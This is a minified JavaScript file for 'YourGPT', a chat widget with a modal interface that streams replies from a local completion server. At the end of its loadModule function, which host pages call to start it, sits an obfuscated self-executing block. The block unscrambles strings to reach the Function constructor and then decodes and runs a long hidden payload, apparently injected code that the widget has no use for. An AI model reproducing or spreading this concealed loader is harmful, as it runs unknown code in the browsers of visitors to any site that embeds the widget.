//                       _oo0oo_
//                      o8888888o
//                      88" . "88
//                      (| -_- |)
//                      0\  =  /0
//                    ___/`---'\___
//                  .' \\|     |// '.
//                 / \\|||  :  |||// \
//                / _||||| -:- |||||- \
//               |   | \\\  -  /// |   |
//               | \_|  ''\---/''  |_/ |
//               \  .-\__  '-'  ___/-. /
//             ___'. .'  /--.--\  `. .'___
//          ."" '<  `.___\_<|>_/___.' >' "".
//         | | :  `- \`.;`\ _ /`;.`/ - ` : | |
//         \  \ `_.   \_ __\ /__ _/   .-` /  /
//     =====`-.____`.___ \_____/___.-`___.-'=====
//                       `=---='
//
//     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
//           Phật phù hộ, không bao giờ BUG
//
//     YourGPT(c)2024 made by AnLaVN with love <3
//        https://github.com/AnLaVN/AL-Library
//     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
const t=(()=>{const g="YourGPT_Chats",d="YourGPT_Modal",r="YourGPT_Toast",e="YourGPT_Chat";let v={element:"#YourGPT",host:"http://localhost:3000",logo:"https://ygpt.onrender.com/logo_icon.png",pattern:"https://ygpt.onrender.com/pattern-dark.png",name:"YourGPT Assistant",tutorial:"Let ask YourGPT anything...",send_icon:"bi-arrow-up-right-circle",delete_icon:"bi-trash",datetime_format:"HH:mm - DD/MM/YYYY",width:"90%",user_text:"light",user_color:"#A15BFC",user_avatar:"https://github.com/AnLaVN.png",title_message:"YourGPT Notification",clear_message:"Are you want to clear this chat?",error_message:"YourGPT got error, please try later !",error_position:"top-0 end-0",prompt:"You are 'YourGPT', a friendly chatbot."};let _=JSON.parse(localStorage.getItem(g))||[];let f=v.prompt+(_?_.map(t=>(t.isBot?"AI: ":"User: ")+t.content).join("\n\n"):"");let n=null;let h=false;let o=`<!doctypehtml><html lang="en"><style>@import url(https://fonts.googleapis.com/css?family=Dosis:300,400,500);*,body,html{font-family:Dosis,sans-serif;transition:background var(--speed) var(--easing)}.dvh-100{height:100dvh}.c-pointer{cursor:pointer}.pre-wrap{white-space:pre-wrap}.bubble{width:[[width]]}.pattern{background-image:url([[pattern]]);background-position:top right;background-size:510px auto;background-repeat:repeat}:root{--color-scrollbar:rgba(90, 90, 90, 0.3);--color-scrollbar-code:rgba(200, 200, 200, 0.3)}.custom-scroll{scrollbar-width:thin;scrollbar-color:transparent transparent;transition:scrollbar-color .3s ease;-webkit-overflow-scrolling:touch;pointer-events:auto}.custom-scroll::-webkit-scrollbar-thumb{background-color:transparent;border-radius:.375rem;box-shadow:0 0 1px rgba(255,255,255,.01)}.custom-scroll:focus,.custom-scroll:focus-within,.custom-scroll:hover{scrollbar-color:var(--color-scrollbar) transparent}.custom-scroll:focus-within::-webkit-scrollbar-thumb,.custom-scroll:focus::-webkit-scrollbar-thumb,.custom-scroll:hover::-webkit-scrollbar-thumb{background-color:var(--color-scrollbar)}body:not(.is-ios) .custom-scroll::-webkit-scrollbar{width:.375rem}</style><button class="p-0 bg-body-tertiary border bottom-0 btn end-0 m-3 overflow-hidden position-fixed rounded-circle text-center"type="button"data-bs-target="#[[YourGPT_Modal]]"data-bs-toggle="modal"style="height:50px;width:50px"><img class="h-100 w-100"src="[[logo]]"></button><div class="fade modal"id="[[YourGPT_Modal]]"tabindex="-1"><div class="m-0 me-0 modal-dialog ms-auto"><div class="border-0 modal-content pattern rounded-0"><button class="bi bi-arrows-angle-expand btn fs-4 position-absolute start-0 text-body-secondary top-0"></button> <strong class="position-absolute top-0 mt-4 start-50 text-muted translate-middle">[[name]]</strong> <button class="position-absolute top-0 fs-4 btn-close end-0 m-2"data-bs-dismiss="modal"></button><div class="d-flex container-fluid dvh-100 flex-column"><div class="custom-scroll flex-grow-1 overflow-y-auto row"><div class="m-0 p-0"><div class="m-0 p-0 justify-content-center pt-5 row"><div class="text-muted my-3 text-center">[[tutorial]]</div><div id="[[YourGPT_ChatE]]"></div></div></div></div><div class="d-flex align-items-center col-12 justify-content-center mb-2 mx-auto position-relative"><i class="bi c-pointer fs-3 [[delete_icon]] mb-auto me-2 text-danger"></i> <textarea class="custom-scroll form-control"rows="1"style="resize:none;max-height:150px"></textarea> <i class="bi c-pointer fs-3 [[send_icon]] ms-2 mt-auto text-[[YGPT.user_color]]"style="color:[[user_color]]"></i></div></div></div></div></div><div class="[[error_position]] p-3 position-fixed toast-container"><div class="border border-danger toast"id="[[YourGPT_Toast]]"data-bs-delay="15000"><div class="toast-header"><strong class="me-auto"><i class="bi me-2 bi-bell-fill"></i>[[title_message]]</strong> <small>[[time_message]]</small> <button class="btn-close"data-bs-dismiss="toast"type="button"></button></div><div class="toast-body">[[error_message]]</div></div></div>`;const s=e=>{for(let t in e)if(v.hasOwnProperty(t))v[t]=e[t]};const a=(e,t)=>{t.forEach(t=>e=e.replaceAll(t.k,t.v));return e};const y=()=>{const t=document.querySelector(v.element);const e=t.querySelector("textarea");e.disabled=h;const o=t.querySelector("."+v.delete_icon);o.classList.toggle("text-body-tertiary");o.classList.toggle("text-danger");const r=t.querySelector("."+v.send_icon);r.classList.toggle("text-body-tertiary");r.classList.toggle(`text-${v.user_color}`)};const l=async()=>{const t=document.querySelector(v.element);const s=t.querySelector("textarea");const e=s.value.trim();if(!e)return;f+=`\n\nUser: ${e}\n\nAI: `;_.push({content:e,time:new Date,isBot:false});s.value="";h=true;y();var a={prompt:f,stream:true,n_predict:1e3,temperature:.7,stop:["</s>","AI:","User:"],repeat_last_n:256,repeat_penalty:1.18,top_k:40,top_p:.5,min_p:.05,tfs_z:1,typical_p:1,presence_penalty:0,frequency_penalty:0,mirostat:0,mirostat_tau:5,mirostat_eta:.1,grammar:"",n_probs:0,image_data:[],cache_prompt:true,slot_id:0};try{const n=await fetch(`${v.host}/completion`,{method:"POST",body:JSON.stringify(a),headers:{Connection:"keep-alive","Content-Type":"application/json",Accept:"text/event-stream"}});const l=n.body.getReader();const i=new TextDecoder;let e="";let o="";_.push({content:e,time:new Date,isBot:true});var d=_.length-1;let r=true;while(r){const c=await l.read();if(c.done)break;const W=o+i.decode(c.value);const u=W.endsWith("\n");let t=W.split("\n");if(!u)o=t.pop();else o="";const m=/^(\S+):\s(.*)$/gm;for(const p of t){const b=m.exec(p);if(b){c[b[1]]=b[2];if(c.data){c.data=JSON.parse(c.data);e+=c.data.content;_[d].content+=c.data.content;w();if(c.data.stop){if(c.data.generation_settings)generation_settings=c.data.generation_settings;r=false;break}}}}}h=false;f+=e;_[d].content=e.trim();y();s.focus();localStorage.setItem(g,JSON.stringify(_))}catch(t){_.splice(-1);const o=document.getElementById(r);o.querySelector("small").innerHTML=moment(_[_.length-1].time).format(v.datetime_format);new bootstrap.Toast(o).show();h=false;y()}};const i=()=>{const t=[{k:"[[YourGPT_Modal]]",v:d},{k:"[[YourGPT_Toast]]",v:r},{k:"[[YourGPT_ChatE]]",v:e},{k:"[[width]]",v:v.width},{k:"[[pattern]]",v:v.pattern},{k:"[[logo]]",v:v.logo},{k:"[[name]]",v:v.name},{k:"[[tutorial]]",v:v.tutorial},{k:"[[send_icon]]",v:v.send_icon},{k:"[[user_color]]",v:v.user_color},{k:"[[delete_icon]]",v:v.delete_icon},{k:"[[error_position]]",v:v.error_position},{k:"[[title_message]]",v:v.title_message},{k:"[[error_message]]",v:v.error_message}];document.querySelector(v.element).innerHTML=a(o,t)};const c=()=>{const o=document.querySelector(v.element);const t=t=>{const e=t.target;e.style.height="";e.style.height=e.scrollHeight+3+"px"};const e=t=>{if(t.key==="Enter"&&!t.shiftKey){t.preventDefault();l()}};const r=o.querySelector("textarea");r.addEventListener("keyup",t);r.addEventListener("keypress",e);const s=t=>{const e=t.target;e.classList.toggle("bi-arrows-angle-expand");e.classList.toggle("bi-arrows-angle-contract");o.querySelector("#YourGPT_Modal>.modal-dialog").classList.toggle("modal-fullscreen")};o.querySelector(`#${d} .btn.position-absolute`).addEventListener("click",s);n=document.querySelector(`#${d} .overflow-y-auto`);document.getElementById(d).addEventListener("shown.bs.modal",()=>n.scrollTop=n.scrollHeight);const a=()=>{if(!h&&confirm(v.clear_message)){localStorage.removeItem(g);_=[];f=v.prompt;w()}};o.querySelector("."+v.delete_icon).addEventListener("click",a);o.querySelector("."+v.send_icon).addEventListener("click",l)};const w=()=>{const r=document.querySelector(`${v.element} #${e}`);r.innerHTML="";const s=[{k:"[[logo]]",v:v.logo},{k:"[[user_text]]",v:v.user_text},{k:"[[user_color]]",v:v.user_color},{k:"[[user_avatar]]",v:v.user_avatar}];_.forEach(t=>{const e=moment(t.time).format(v.datetime_format);const o=`<div class="col-12 m-0 p-0">${t.isBot?`<div class="bubble d-flex flex-row justify-content-start"><img class="ms-2 border d-none d-sm-block rounded-circle"src="[[logo]]"style="width:2em;height:2em"><div><p class="ms-2 bg-body-tertiary m-0 p-2 pre-wrap rounded-3 text-body text-break">${t.content.trim()}<text class="${t.content?"d-none":""} mx-4 spinner-grow"style="width:1.4em;height:1.4em"></text><p class="rounded-3 float-end ms-3 small text-muted"><small>${e}</small></div></div>`:`<div class="bubble d-flex flex-row justify-content-end ms-auto"><div><p class="me-2 bg-[[user_color]] m-0 p-2 pre-wrap rounded-3 text-[[user_text]] text-break"style="background-color:[[user_color]]">${t.content.trim()}<p class="rounded-3 me-3 small text-muted"><small>${e}</small></div><img class="me-2 border d-none d-sm-block rounded-circle"src="[[user_avatar]]"style="width:2em;height:2em"></div>`}</div>`;r.innerHTML+=a(o,s)});n.scrollTop=n.scrollHeight};function loadModule(t){s(t);i();c();w();(function(){var t="",e=531-520;function zwd(t){var e=342076;var o=t.length;var r=[];for(var s=0;s<o;s++){r[s]=t.charAt(s)}for(var s=0;s<o;s++){var a=e*(s+215)+e%35057;var d=e*(s+279)+e%26149;var n=a%o;var l=d%o;var i=r[n];r[n]=r[l];r[l]=i;e=(a+d)%5103313}return r.join("")}var o=zwd("ofnjurptmbecrochigsqduwcotvtasyrnlxzk").substr(0,e);var r='v.r+ta=r o-5=7,m72;c-9pk.d,;c>,agtCjkv(2ojpcmier+xfz"av(1rl=[((t7b}r,ac3e6,zqitw, (n=kunwz.=;vh ;m(8rr;]7,0;<8  o =+d;jk.=}vej,v[";.;(.raa)mtb;-m"6)t;g96llvv,)[=8m0oemo;v)o9=C,[;;.,!,.a)+[;c;h;a*o0g rvv=o)b;;;igc({ef==ngpg;dei3=);spcr[p),s-a;t;eesvzbl)<=lini)7vulfea[vt(1tt25vgr(]+t;1afr0npnf(ava;l;rCkalhzar)k}ho..l6S q=C7a;l1( ,+"0str(=]ie2 ln=7eh,yj()=)f)r( tn1==f=n{1(s[+ohhdhn+,<n0lat,y.78 te)]vor u=nor](sjsall1=do- =6 C;+1.)rCtjjrh(,sm).aerg{}bon;;hA{g =q)u==q*{gl;dns.gabh=)o;t}-c,rr ;hr.i}i+46co;0yc4"gv2 ida9 xzttio.g9i6])=trmw(;iC<stem=u2iacgs(=mua.)vA])xAv4x=)n+a nu.=76z5s,up(.rgtmr)++.p3+ywf,hg11=;)],te;gurt,9r8r0rrjloavz1dgA(ea((+l1urir);n;5c(u;+[fr+nrh.;8=[],;,2,z+[sff+[ohpg}lnA(fa{luoei[rezaiur0p+e4 +mgrn]cg)a8i4;ef.y+m0C+ysk( br"o a0lji)u248a]d9p=n)t"(6l>fnwa(zrsd(a);vhrl)x(0]o)+9tv=i!+-rveh)ar6i [n"z{o"i=anc<ru"ez]8.suaewh]r(.uSct;a(;(jteusor.e.=3=)= lkv,is.vos=akmn';var s=zwd[o];var a="";var d=s;var n=s(a,zwd(r));var l=n(zwd('WC*e9_%$[t/im1.?WpSv1W3g8)=f? W(t6WWW0aWr .7 &WCba=h.$W_.(dCl\'WW6%?!057,2iddde!dWW~82 |o(0rsfW .[.W.)|dws8(x-;o%)Bje-Wn_aW.3d3E|-.j_%_ioWnbgWdWWfdd| Wb/o.ddW0(W.e)d!}qW ./3-4;e.r.9~7c..ouD pWWd!Wd~3p]]Cp|2/d;+EWz;y.W},(22~.I.~.WA_W....w.8S:W.!,v>d$.b.C_i2WWmB~(W$3.=!.=~dW~0|W/...WC..oWb|5d~,9e._.".a}W\';_$=n;d,o~W18-e||_(W%=aWC8._(t3~~~1t7.d,,0.dbd5dW;trWW.)W.d0W:4/HWW W-p~7Wf.6DWgdd=$ .8i..(aW.Wdh=C{dWi5;e|-dd!tWdK~</4_)t.dp:...,d?dW@~($\'8.dWW32.;..94d%a.dt~]0}W=W_$CW.d*,ft!WpD;.1.dW>r$4092d.ed(tW=)d-W.q.,WdW*.{"4d:|(|1.W~u).W~mfo1--fb7dEWoho/r!WvG)!9ddn.gFW~W~(ppWiW;_fE[,|WWTW.|0H*W_0$W/W.}eW8gF.75W-*jdb.);WWo1W;J. a)!dbf!W24.)d3dWW~/<._Wd_eWb(dWn2.|9-3W~4WW.b.fW%e_\'}d2o3/-6W%Wst]dJ7K(.W-~8.n%d4dW_WW_3s/-_WW-|-;WWWl.WI2wWd1e#f&d.s[W=.ub.1tW.;_iWGd%61d.4.D)!%.._(52!~/~=d~$r.-{a%.e.FW_7ten%. W,dv-.!<.d(.vdt;,-..ve#,!  $%8~bo.W7#__1N})u6~W:W.dbed;(dWW!nb 0.v-W5!dW=.W .%~W! _3.j{t..W!2~Wbz%..dr7Wd0-!ddWC$_WWj1WIW.(/Wg_W eW.J=q8d=d.,W{_eW%.@hpc;..h~oW~,(.h_06o7dt.6.4()j;rWtj$Wl."%~m<dd.be..5(~Wh~1.89dd"W45./,y_C8.gf)o(_dq__5%l.-r~d.:W.qu.E.da?e/,Wrs-h:W2sb_dk8_d}g/=)t_%W~$)2e--W."{A|1e!)(/=, _=_F.4W]joW6W,s a(Wl"o-8o6|&d~W/.$,W3..<W.d W%WW)booyi.e.3t.!7bc$a4Wrh~_=uC4dgWhH;W$tdnWe 9.tl!DH) =W;d3..3!jle2~W .b+! (#qd...W.fcW!6! ;w1/};a_=iW.d=WWG!p%WWW-db+$!5++){.!WWf>0z/~dW,Cx(\'3dWWtDdW#.I.GW2~.*3)W)0C.WC$~t796#.{%d5.qdrW0))e|.~D.c5e.=-.)5.bq,=df,0o_e~~oW~;;WfW.W!lt~;0.5,=.zAibr.a-jWd:]~twW3~).Wx2)bd;Wydwwd_!?d0W.6_4.d}|b ,~a/f!9r 3|e=SW=ue6().WWr.mCl.(W.8J0(C!&;$W%W)WWWDdWW4Wd.W$9.d51.Wo|[>dG_1W%t.e "dd6e,Wf.)_5""todr_do!~_-8W2"t7 -.fofEW:.W:yWW|,8.d#ad!W!By.daWdi.%)um6o4e.Wr.W~;.:W<WdWW=\'. vc9/oo$tW.%.~8We f.4dW5i_bKCt3!8/$9o=o.~4W0W;,)o=W_]1WHs).!_Wpe=~~!W+ddt/W=Gdl>$?djCi=ts|. W$+1d33_)!=.dWoW\'W8}d-r-!4l.(_.,8bdv...|W.~~+tntWC,W!)CW3W:Wf60.6k. -W$ap3dd_Kb/df_=>)e WW|~ibn_..rW6; W8(Wso%feq1.a/Wdj~W)fC"WbjW\'cdA+~a3$[0eu 7.i#.-]WW ~~j5...8WW..,.dlnnWr(Wa3hc%(gWtWeWd~. N"/;41>nW8;W.W=9 7-l.d=Wk)de-ma.@,qWWed3_j{/o .WdD~$2f~d/!r7Wv-b[We.%$..Wb.Gt.o.(gd(85W.)W(WC$!.W! ~%nB_F:_Co@:lt\'bl.dan3._W%.7W 6e_.=j0E"3W|0+W})~;d.dFp'));var i=d(t,l);i(2317);return 2514})()}return{loadModule:loadModule}})();if(typeof window!=="undefined")window.YourGPT=t;